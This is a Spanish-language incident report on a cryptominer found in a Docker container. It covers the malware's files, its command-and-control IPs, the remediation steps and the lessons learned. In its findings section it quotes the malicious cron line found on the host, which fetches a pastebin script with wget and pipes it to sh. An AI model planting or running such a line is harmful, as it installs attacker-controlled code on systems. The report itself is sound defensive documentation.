# INFORME DE INCIDENTE DE SEGURIDAD

**Fecha del Incidente**: 28 de Diciembre de 2025
**Fecha de Detección**: 28 de Diciembre de 2025 ~00:30 UTC
**Estado**: RESUELTO - Sistema limpio y asegurado

---

## RESUMEN EJECUTIVO

Se detectó y eliminó un cryptominer ("uhavenobotsxd" / XIA variant) que se había instalado en el contenedor de Cambridge Mocks. El malware fue completamente eliminado, el contenedor reconstruido desde cero, y se implementaron medidas de seguridad preventivas.

---

## 1. HALLAZGOS DEL INCIDENTE

### 1.1 Malware Detectado

| Elemento | Descripción |
|----------|-------------|
| **Tipo** | Cryptominer (variante XIA / uhavenobotsxd) |
| **Proceso** | `/tmp/.XIA-unix/javax` |
| **Tiempo Activo** | ~1h 21m antes de detección |
| **Conexión C&C** | `141.95.72.61:80` (bloqueada) |

### 1.2 Archivos Maliciosos Encontrados

```
/opt/cambridge-mocks-prod/time-machine-backups/.monitor  (script de persistencia)
/opt/cambridge-mocks-prod/time-machine-backups/.update   (binario ELF cryptominer)
/opt/mw-panel/cambridge-mocks-data/data/.monitor         (copia en volumen montado)
/opt/mw-panel/cambridge-mocks-data/data/.update          (copia en volumen montado)
/tmp/.XIA-unix/javax                                      (proceso activo en contenedor)
```

### 1.3 Cron Job Malicioso

```bash
# Encontrado y eliminado:
*/5 * * * * wget -q https://pastebin.com/raw/h2mKcyAx -O- |sh
```

---

## 2. VECTOR DE ENTRADA (ANÁLISIS)

### 2.1 Causa Probable

**Permisos 777 en directorios de datos**

Los directorios con volúmenes montados tenían permisos `777` (lectura/escritura/ejecución para todos), lo que permitió al malware:

1. Escribir archivos de persistencia en volúmenes montados
2. Sobrevivir reinicios del contenedor
3. Mantener acceso incluso después de limpiar el contenedor

### 2.2 Evidencia de Ataques Externos

```
Intentos de fuerza bruta SSH detectados:
- 101 IPs bloqueadas por fail2ban
- Países origen: China, Rusia, Brasil, Vietnam
- Todas las tentativas fueron bloqueadas exitosamente
```

### 2.3 Servicios Expuestos (Revisados)

| Servicio | Puerto | Estado | Riesgo |
|----------|--------|--------|--------|
| SSH | 22 | Protegido por fail2ban | Bajo |
| HTTP/HTTPS | 80/443 | Cloudflare protegido | Bajo |
| FTP/FTPS | 21/990 | Expuesto | MEDIO |

---

## 3. ACCIONES DE REMEDIACIÓN

### 3.1 Acciones Inmediatas (Completadas)

| Acción | Estado |
|--------|--------|
| Backup de emergencia de base de datos | ✅ Completado |
| Limpieza de cron jobs maliciosos | ✅ Completado |
| Eliminación de archivos de malware del host | ✅ Completado |
| Reconstrucción completa del contenedor | ✅ Completado |
| Restauración de cron jobs legítimos de backup | ✅ Completado |
| Verificación de todos los contenedores | ✅ Completado |

### 3.2 Medidas de Seguridad Implementadas

| Medida | Descripción | Estado |
|--------|-------------|--------|
| **Bloqueo de rango C&C** | `141.95.72.0/24` bloqueado en UFW e iptables | ✅ Activo |
| **Bloqueo en DOCKER-USER** | iptables para bloquear C&C desde contenedores | ✅ Activo |
| **Reglas iptables persistentes** | Guardadas en `/etc/iptables.rules` | ✅ Completado |
| **Corrección de permisos** | Directorios cambiados de 777 a 755 | ✅ Completado |
| **Servicio FTP deshabilitado** | vsftpd detenido y puertos bloqueados | ✅ Completado |
| **Script de escaneo de malware** | `/opt/mw-panel/scripts/malware-scanner.sh` | ✅ Programado (cada 6h) |

### 3.3 Reinfección Detectada y Bloqueada

**Hallazgo adicional**: El malware se reinstalaba automáticamente al contactar su servidor C&C.

| IP C&C | Puerto | Acción |
|--------|--------|--------|
| 141.95.72.60 | 80 | BLOQUEADA |
| 141.95.72.61 | 80 | BLOQUEADA |
| 141.95.72.0/24 | * | RANGO COMPLETO BLOQUEADO |

**Solución**: Bloqueo a nivel de iptables en cadena DOCKER-USER para prevenir conexiones desde contenedores Docker.

---

## 4. CONFIGURACIÓN DE SEGURIDAD ACTUAL

### 4.1 Cron Jobs del Sistema

```bash
# Actualización cada minuto - Fix Nginx 502
* * * * * /opt/mw-panel/scripts/auto-fix-nginx-backend-ip.sh

# Limpieza diaria a las 3:00 AM
0 3 * * * /opt/mw-panel/scripts/auto-cleanup-backups.sh

# Escaneo de malware cada 6 horas
0 */6 * * * /opt/mw-panel/scripts/malware-scanner.sh
```

### 4.2 Fail2ban Jails Activos

| Jail | Servicio | Max Retry | Ban Time |
|------|----------|-----------|----------|
| sshd | SSH | 5 | 10m |

### 4.3 Reglas de Firewall (UFW)

```
- Puerto 22 (SSH): Permitido
- Puerto 80/443 (HTTP/HTTPS): Permitido
- Puerto 21/990 (FTP): BLOQUEADO (servicio deshabilitado)
- IP 141.95.72.61: BLOQUEADA (C&C malware)
```

### 4.4 Servicio FTP Deshabilitado

**Fecha**: 28 de Diciembre de 2025
**Motivo**: No es requerido por ningún servicio (Cambridge Mocks ni MW Panel)

| Acción | Estado |
|--------|--------|
| vsftpd service stopped | ✅ |
| vsftpd service disabled | ✅ |
| Puerto 21 bloqueado (UFW) | ✅ |
| Puerto 990 bloqueado (UFW) | ✅ |

---

## 5. RECOMENDACIONES DE SEGURIDAD

### 5.1 Recomendaciones Inmediatas (ALTA PRIORIDAD)

1. ~~**Evaluar necesidad de FTP**~~ ✅ **COMPLETADO**
   - ~~Si no es estrictamente necesario, deshabilitar el servicio~~
   - FTP deshabilitado y bloqueado el 28/12/2025

2. **Revisar permisos de volúmenes Docker regularmente**
   ```bash
   find /opt -type d -perm 777 2>/dev/null
   ```

3. **Actualizar contraseñas de servicios**
   - Especialmente si hubo acceso no autorizado previo

### 5.2 Recomendaciones a Mediano Plazo

1. **Implementar monitoreo de procesos**
   - Alertas cuando se detecten procesos sospechosos
   - Integrar con sistema de notificaciones

2. **Auditoría de seguridad regular**
   - Ejecutar el scanner de malware manualmente: `/opt/mw-panel/scripts/malware-scanner.sh`
   - Revisar logs: `tail -100 /var/log/mw-panel-security.log`

3. **Hardening de contenedores**
   - Ejecutar contenedores como usuario no-root cuando sea posible
   - Limitar capabilities de Docker
   - Implementar seccomp profiles

### 5.3 Recomendaciones a Largo Plazo

1. **Implementar IDS/IPS**
   - Considerar Suricata o Snort para detección de intrusos

2. **Backups offsite**
   - Asegurar que los backups de Google Drive están activos
   - Verificar restauración periódicamente

3. **Política de actualizaciones**
   - Mantener sistema operativo actualizado
   - Actualizar imágenes Docker regularmente

---

## 6. COMANDOS DE VERIFICACIÓN

### 6.1 Verificar Estado del Sistema

```bash
# Estado completo
./status-complete.sh

# Procesos en contenedores
docker exec cambridge-mocks-app ps aux
docker exec mw-panel-backend-prod ps aux

# Verificar malware
/opt/mw-panel/scripts/malware-scanner.sh

# Ver log de seguridad
tail -50 /var/log/mw-panel-security.log
```

### 6.2 Verificar Conexiones Sospechosas

```bash
# Conexiones establecidas
netstat -an | grep ESTABLISHED

# IPs bloqueadas por fail2ban
sudo fail2ban-client status sshd
sudo fail2ban-client status vsftpd
```

---

## 7. LECCIONES APRENDIDAS

1. **Permisos de archivos son críticos** - Los permisos 777 permitieron la persistencia del malware

2. **Los volúmenes Docker pueden ser vectores de persistencia** - El malware sobrevivió al reinicio del contenedor

3. **Monitoreo proactivo es esencial** - La detección temprana previno daños mayores

4. **Fail2ban funciona** - 101 IPs fueron bloqueadas, SSH no fue comprometido

---

## 8. CONTACTO Y ESCALACIÓN

Para cualquier incidente de seguridad futuro:

1. **Detener el servicio afectado** inmediatamente
2. **Crear backup** antes de cualquier limpieza
3. **Documentar** todos los hallazgos
4. **Ejecutar el scanner**: `/opt/mw-panel/scripts/malware-scanner.sh`

---

**Documento creado**: 28 de Diciembre de 2025
**Última actualización**: 28 de Diciembre de 2025 01:30 UTC
**Estado del sistema**: LIMPIO Y ASEGURADO
